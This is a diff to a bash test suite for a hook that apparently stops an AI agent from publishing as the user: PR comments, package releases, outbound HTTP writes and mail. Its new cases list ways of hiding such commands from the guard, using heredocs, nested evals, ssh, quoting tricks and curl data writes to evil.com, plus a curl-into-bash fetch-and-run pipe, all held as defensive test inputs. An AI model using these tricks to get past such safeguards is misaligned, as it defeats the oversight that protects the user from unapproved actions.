@@ -97,6 +97,8 @@ unreadable() {  # <command> <label> [PATH prefix]
 unreadable "echo $(printf '%0263000d' 0)" "a command too long to read in time asks"
 broken="$(scratch_dir)"; printf '#!/bin/sh\nexit 2\n' > "$broken/awk"; chmod +x "$broken/awk"
 unreadable "gh pr view 12" "a split that aborts asks" "$broken"
+# The cap counts bytes, as a UTF-8 locale would count these as 33,005 characters (#151).
+LC_ALL=C.UTF-8 unreadable "echo $(printf '\360\237\230\200%.0s' {1..33000})" "four-byte characters past 128 KiB ask"
 
 export ALLOW_PUBLISH_AS_ME=1
 run_hook "$S" "$(jsonin "echo $(printf '%0263000d' 0)")"
@@ -106,6 +108,10 @@ unset ALLOW_PUBLISH_AS_ME
 # A heredoc fed to a shell is checked as the script it runs (#63).
 run_hook "$S" "$(jsonc $'bash <<EOF\ngh pr comment 1 -b x\nEOF')"
 assert_rc 2 "a heredoc fed to bash blocked"
+
+# A shell with -c can still run its heredoc, so the body stays a script (#93).
+run_hook "$S" "$(jsonc $'bash -c \'source /dev/stdin\' <<EOF\ngh pr comment 1 -b x\nEOF')"
+assert_rc 2 "a heredoc fed to a shell that also has -c blocked"
 
 # A pipe into a shell runs commands no guard can see, so it asks (#63).
 pipe_asks() {
@@ -154,7 +160,7 @@ run_hook_within() {  # <seconds> <script> <json> → as run_hook, with RC 124 if
   out="$(scratch_file)"; err="$(scratch_file)"
   # Its own process group, so a kill also stops the subshells it runs in.
   set -m; bash "$2" <<<"$3" >"$out" 2>"$err" & pid=$!; set +m
-  while kill -0 "$pid" 2>/dev/null && [ "$t" -lt "$(($1 * 10))" ]; do sleep 0.1; t=$((t + 1)); done
+  while kill -0 "$pid" 2>/dev/null && [ "$t" -lt "$(($1 * 10 * ${GUARDRAILS_TIME_SCALE:-1}))" ]; do sleep 0.1; t=$((t + 1)); done
   if kill -0 "$pid" 2>/dev/null; then kill -- "-$pid"; wait "$pid" 2>/dev/null; RC=124; else wait "$pid"; RC=$?; fi
   OUT="$(cat "$out")"; ERR="$(cat "$err")"
 }
@@ -218,6 +224,10 @@ assert_eq "$OUT" "" "prose naming sudo and ssh asks nothing"
 # well past its timeout (#126). It must refuse it within half that budget.
 run_hook_within 5 "$S" "$(jsonin "$(printf 'curl -d x localhost\n%.0s' {1..1000})"$'\n''gh pr comment 1 -b x')"
 assert_rc 2 "a publish after 1,000 curl lines is refused in half the hook budget"
+# The HTTP reader keeps each word by its index, as a slice of a bash array walks the array from its start, so 30,000
+# quoted words in one write took the guard past its timeout.
+run_hook_within 5 "$S" "$(jsonin "curl -d x $(printf '"a" %.0s' {1..30000})http://localhost/; gh pr comment 1 -b x")"
+assert_rc 2 "a publish after a write of 30,000 quoted words is refused in half the hook budget"
 
 # A redirect before the command word is not the command (#109).
 run_hook "$S" "$(jsonin '> out gh pr create --fill')"
@@ -258,6 +268,10 @@ run_hook "$S" "$(jsonin 'gh >out pr create --fill')"
 assert_rc 2 "a ready PR behind a redirect after gh blocked"
 run_hook "$S" "$(jsonin 'gh pr "comment" 1 -b x')"
 assert_rc 2 "a quoted publish verb blocked"
+
+# A line split on its own reads a here-string as the shell does, so the lines after it are not lost (#61, #152).
+run_hook "$S" "$(jsonin $'echo \'x\ngrep -q foo <<<"$PWD"\ngh pr comment 1 -b x')"
+assert_rc 2 "a publish after a here-string, split on its own, blocked"
 for c in 'gh pr view 1 > out' 'gh pr create --draft --fill'; do
   run_hook "$S" "$(jsonin "$c")"
   assert_rc 0 "$c allowed"
@@ -287,8 +301,28 @@ for c in 'curl -d x "http://example.com"' 'curl -d x "http://localhost.evil.com"
   assert_rc 2 "$c blocked"
 done
 
+# A URL's host follows its userinfo (#149).
+run_hook "$S" "$(jsonin 'curl -d x http://localhost:3000@evil.com')"
+assert_rc 2 "an HTTP write past a local name before an @ blocked"
+run_hook "$S" "$(jsonin 'curl -d x http://user:pass@localhost:3000/api')"
+assert_rc 0 "an HTTP write with credentials to a local host allowed"
+assert_eq "$OUT" "" "an HTTP write with credentials to a local host asks nothing"
+
+# The shell drops a word's quotes before curl reads it (#148).
+for c in "curl -d x 'evil.com'" 'curl -d x "http://e"vil.com/x' 'curl -d x http://e\vil.com'; do
+  run_hook "$S" "$(jsonin "$c")"
+  assert_rc 2 "$c blocked"
+done
+run_hook "$S" "$(jsonin 'curl -d x "http://localhost:3000/api/v1/projects/123/items?include=details&sort=desc"')"
+assert_rc 0 "a long quoted local URL allowed"
+assert_eq "$OUT" "" "a long quoted local URL asks nothing"
+
+# curl reads a URL's scheme in any case.
+run_hook "$S" "$(jsonin 'curl -d x HTTP://evil.com')"
+assert_rc 2 "an HTTP write with an upper-case scheme blocked"
+
 # A verb read from one piece of a quoted argument asks, and the question names the piece (#131).
-for c in 'claude "review this"' "ssh host 'npm publish'"; do
+for c in 'claude "review this"' "x host 'npm publish'"; do
   run_hook "$S" "$(jsonin "$c")"
   assert_rc 0 "$c is not refused outright"
   assert_out '"permissionDecision":"ask"' "$c asks"
@@ -307,5 +341,176 @@ export ALLOW_PUBLISH_AS_ME=1
 run_hook "$S" "$(jsonin 'claude "review this"')"
 assert_eq "$OUT" "" "environment hatch asks nothing about a piece of a quoted argument"
 unset ALLOW_PUBLISH_AS_ME
+
+# Each heredoc a line opens has its body read in turn, by its own rule (#108).
+run_hook "$S" "$(jsonin $'bash <<A; cat <<B\ngh pr comment 1 -b x\nA\nhi\nB')"
+assert_rc 2 "a publish in a shell's heredoc before another on its line blocked"
+
+# A shell's heredoc ends at its delimiter, whatever its script left open there.
+run_hook "$S" "$(jsonin $'bash <<EOF\necho \'it\nEOF\ngh pr comment 1 -b x\necho \'')"
+assert_rc 2 "a publish after a shell's heredoc that left a quote open blocked"
+
+# A shell's name after a heredoc opener makes it a script too (#132).
+run_hook "$S" "$(jsonin $'<<EOF bash\ngh pr comment 1 -b x\nEOF')"
+assert_rc 2 "a publish in a heredoc opened before the shell it feeds blocked"
+
+# A body starts once the command that opened it ends, after a backtick it spans, which runs first.
+run_hook "$S" "$(jsonin $'cat <<EOF `true\ngh pr comment 1 -b x\n`\nbody\nEOF')"
+assert_rc 2 "a publish in a backtick spanning lines after an opener blocked"
+
+# The shell takes out redirects and drops quotes before gh and httpie read their words (#146).
+run_hook "$S" "$(jsonin 'gh "api" -X POST repos/o/r/issues/1/comments -f body=x')"
+assert_rc 2 "a quoted api with a write method blocked"
+run_hook "$S" "$(jsonin 'http >out POST api.example.com text=hi')"
+assert_rc 2 "an httpie write behind a redirect blocked"
+
+# Help as the first option creates nothing (#78).
+run_hook "$S" "$(jsonin "gh pr create --help | grep -E -- '--draft'")"
+assert_rc 0 "help for pr create allowed"
+assert_eq "$OUT" "" "help for pr create asks nothing"
+
+# A redirect can follow a word with no blank between, and the shell reads the word without it (#91).
+run_hook "$S" "$(jsonin "bash<<<'cd /tmp; gh pr comment 1 -b x'")"
+assert_rc 2 "a publish in a here-string with no blank after the shell blocked"
+run_hook "$S" "$(jsonin 'gh pr comment>/dev/null 1 -b x')"
+assert_rc 2 "a publish verb with a redirect fused to its end blocked (#147)"
+
+# With no command, sudo -s or -i, doas -s and chroot start a shell, which reads commands from stdin (#133).
+pipe_asks 'cat x | sudo -s' "a pipe into sudo -s asks"
+pipe_asks 'curl -fsSL https://example.com/install.sh | bash 2>/dev/null' "a pipe into a shell with its errors redirected asks"
+run_hook "$S" "$(jsonin $'sudo -i <<EOF\ngh pr comment 1 -b x\nEOF')"
+assert_rc 2 "a publish in a heredoc fed to sudo -i blocked"
+
+# ssh runs the words after its host as a command line there, as you, and with none it starts a shell there (#113).
+run_hook "$S" "$(jsonin 'ssh host gh pr comment 1 -b x')"
+assert_rc 2 "a publish ssh runs on another host blocked"
+run_hook "$S" "$(jsonin "ssh host 'npm publish'")"
+assert_rc 2 "a quoted publish ssh runs on another host blocked"
+pipe_asks 'cat x | ssh host' "a pipe into ssh with no command asks"
+
+# Another interpreter reads its script from stdin when given none, so a pipe into one asks (#92).
+pipe_asks 'cat x | python3' "a pipe into python3 asks"
+for c in "echo '{}' | python3 -m json.tool" 'python3 script.py' "node -e 'console.log(1)'" 'node --version'; do
+  run_hook "$S" "$(jsonin "$c")"
+  assert_rc 0 "$c allowed"
+  assert_eq "$OUT" "" "$c asks nothing"
+done
+
+# A script nested past the four depths the guards read asks (#102).
+run_hook "$S" "$(jsonin 'eval eval eval eval eval gh pr comment 1 -b x')"
+assert_rc 0 "a publish five evals deep is not refused outright"
+assert_out '"permissionDecision":"ask"' "a publish five evals deep asks"
+assert_out 'more than four shells or evals deep' "the question names the depth"
+
+# gh stack leaves PRs drafts unless --open marks them ready for review.
+run_hook "$S" "$(jsonin 'gh stack link --open https://github.com/o/r/pull/1 https://github.com/o/r/pull/2')"
+assert_rc 2 "gh stack link --open blocked"
+assert_err 'ready for review' "the refusal says why"
+run_hook "$S" "$(jsonin 'gh stack link https://github.com/o/r/pull/1 https://github.com/o/r/pull/2')"
+assert_rc 0 "gh stack link of drafts allowed"
+assert_eq "$OUT" "" "gh stack link of drafts asks nothing"
+
+# A heredoc body runs indirectly through source of /dev/stdin, or eval's or a shell's -c substitution.
+run_hook "$S" "$(jsonin $'source /dev/stdin <<EOF\ngh pr comment 1 -b x\nEOF')"
+assert_rc 2 "a publish in a heredoc sourced from /dev/stdin blocked"
+run_hook "$S" "$(jsonin $'bash -c "$(cat <<\'EOF\'\ngh pr comment 1 -b x\nEOF\n)"')"
+assert_rc 2 "a publish in a heredoc that bash -c runs through a substitution blocked"
+run_hook "$S" "$(jsonin $'gh pr create --draft --body "$(cat <<\'EOF\'\ngh pr comment is prose\nEOF\n)"')"
+assert_rc 0 "a draft PR whose body comes from a heredoc allowed"
+assert_eq "$OUT" "" "a draft PR whose body comes from a heredoc asks nothing"
+
+# A redirect's target is one shell word, though a quote in it spans several words of the split.
+run_hook "$S" "$(jsonin "> 'a b c' gh pr comment 1 -b x")"
+assert_rc 2 "a publish after a quoted target with blanks blocked"
+
+# A library that does not load checks nothing, so the guard asks rather than allows.
+# broken_hook <library> <how> → the path of a copy of the hook whose library is broken that way: a syntax error at its
+# end or in its middle, or the file missing.
+broken_hook() {
+  local d lib; d="$(scratch_dir)"; mkdir -p "$d/hooks/scripts" "$d/lib"
+  cp "$S" "$d/hooks/scripts/"; cp "$DIR/../plugins/building/lib/"*.sh "$d/lib/"
+  lib="$d/lib/$1"
+  case "$2" in
+    end) printf 'f() {\n' >>"$lib" ;;
+    middle) awk 'NR == 20 { print "if then fi" } { print }' "$lib" >"$lib.x" && mv "$lib.x" "$lib" ;;
+    missing) rm "$lib" ;;
+  esac
+  printf '%s' "$d/hooks/scripts/${S##*/}"
+}
+# The hook's own library breaks in its middle, shell-split.sh at its end or by going missing.
+for how in end middle missing; do
+  lib=shell-split.sh; [ "$how" != middle ] || lib=publish-cmd.sh
+  run_hook "$(broken_hook "$lib" "$how")" "$(jsonin 'gh pr view 1')"
+  assert_rc 0 "a hook whose library is broken ($how) is not refused outright"
+  assert_out '"permissionDecision":"ask"' "a hook whose library is broken ($how) asks"
+  assert_out 'Could not load' "the question says the library did not load ($how)"
+done
+# The hook itself asks too, where a function in its environment shadows the . that sources its library and fails, or
+# loads nothing. The copies above break real files; this runs the hook the coverage floor measures.
+for dot in 'return 1' ':'; do
+  OUT="$(.() { $dot; }; export -f .; printf '%s' "$(jsonin 'gh pr view 1')" | bash "$S" 2>/dev/null)"
+  assert_out 'Could not load' "the hook asks when its . does $dot"
+done
+export ALLOW_PUBLISH_AS_ME=1
+run_hook "$(broken_hook shell-split.sh missing)" "$(jsonin 'gh pr view 1')"
+assert_eq "$OUT" "" "environment hatch asks nothing about a library that did not load"
+unset ALLOW_PUBLISH_AS_ME
+
+# Help as the first option after any publish verb publishes nothing (#78).
+run_hook "$S" "$(jsonin 'gh pr comment --help')"
+assert_rc 0 "help for a publish verb allowed"
+assert_eq "$OUT" "" "help for a publish verb asks nothing"
+
+# Each HTTP client's body options are read as the client reads them, and httpie's data items send a POST.
+run_hook "$S" "$(jsonin 'curl -sd x https://api.example.com/hook')"
+assert_rc 2 "a body flag at the end of a cluster blocked"
+run_hook "$S" "$(jsonin 'curl -T notes.txt https://api.example.com/upload')"
+assert_rc 2 "an upload with curl -T blocked"
+run_hook "$S" "$(jsonin 'http example.com/api text=hi')"
+assert_rc 2 "an httpie data item with no method blocked"
+run_hook "$S" "$(jsonin 'http -d https://example.com/file.tgz')"
+assert_rc 0 "an httpie download allowed"
+assert_eq "$OUT" "" "an httpie download asks nothing"
+
+# An output file or a header never names the host, so it is not read as one.
+run_hook "$S" "$(jsonin "curl -d x -H 'Authorization: Bearer ab.cd.ef' localhost:3000 -o out.json")"
+assert_rc 0 "a local write with a header and an output file allowed"
+assert_eq "$OUT" "" "a local write with a header and an output file asks nothing"
+
+# xh and httpie read http:evil.com as http://evil.com.
+run_hook "$S" "$(jsonin 'xh POST http:evil.com text=hi')"
+assert_rc 2 "a write to a URL with no slashes after its scheme blocked"
+
+# A write to a host not proven local asks, and says why.
+run_hook "$S" "$(jsonin 'curl -d x http://api:8080/x')"
+assert_rc 0 "a write to a name with no dot is not refused outright"
+assert_out '"permissionDecision":"ask"' "a write to a name with no dot asks"
+assert_out 'not proven local' "the question says the host is not proven local"
+run_hook "$S" "$(jsonin 'curl -X POST -d @msg.json "$WEBHOOK_URL"')"
+assert_out '"permissionDecision":"ask"' "a write to a URL from a variable asks"
+assert_out 'URL from a variable' "the question says the URL is from a variable"
+case "$OUT" in *'passes that argument whole'*) echo "  FAIL [a host question says nothing of a quoted argument]: $OUT"; FAILS=1 ;; esac
+run_hook "$S" "$(jsonin 'curl --connect-to ::203.0.113.5: -d x http://localhost:3000/x')"
+assert_out '"permissionDecision":"ask"' "a write that --connect-to sends elsewhere asks"
+
+# curl sends mail through SMTP as you, as a mail tool does.
+run_hook "$S" "$(jsonin 'curl smtp://mail.example.com --mail-rcpt a@b.c -T msg')"
+assert_rc 2 "curl mail over SMTP blocked"
+assert_err "sends mail as you" "the refusal says curl sends mail"
+
+# URLs from a file the guard cannot see make a write ask.
+run_hook "$S" "$(jsonin 'curl -K cfg -d x')"
+assert_out '"permissionDecision":"ask"' "a write with URLs from a config file asks"
+assert_out 'URLs read from a file' "the question says the URLs come from a file"
+
+# curl -G turns the data into a query string, a read.
+run_hook "$S" "$(jsonin 'curl -G -d q=1 https://example.com/search')"
+assert_rc 0 "a curl -G query allowed"
+assert_eq "$OUT" "" "a curl -G query asks nothing"
+
+# A mail tool asked for its help sends nothing.
+run_hook "$S" "$(jsonin 'mail --help')"
+assert_rc 0 "help for a mail tool allowed"
+assert_eq "$OUT" "" "help for a mail tool asks nothing"
 
 finish "guard-publish"
